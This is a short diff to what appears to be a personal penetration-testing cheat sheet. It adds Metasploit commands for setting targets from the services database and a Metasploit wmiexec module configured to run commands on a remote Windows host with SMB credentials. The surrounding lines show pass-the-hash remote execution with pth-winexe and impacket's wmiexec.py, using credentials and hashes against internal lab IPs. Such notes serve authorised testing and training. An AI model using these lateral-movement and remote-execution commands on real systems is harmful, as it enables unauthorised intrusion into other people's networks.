@@ -56,6 +56,8 @@ notes -S <search term/regex>
 notes -d <host>
 services <ip>
 services -p <port> -u
+# set RHOSTS to results with -R
+services -p <port> -u -R 
 vulns
 
 fg
@@ -472,6 +474,15 @@ pth-winexe -U kevin%f8uHwN88Sx //10.11.1.230 cmd
 ####  wmiexec.py             ######
 ###################################
 python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes :cb5141dcdaa451b097asdfadsfds Administrator@1.2.1.2
+
+
+use auxiliary/scanner/smb/impacket/wmiexec
+set COMMAND ipconfig
+set RHOSTS 192.168.217.220
+set SMBUser <user>
+set SMBPass <pass>
+
+
 
 
 ###################################
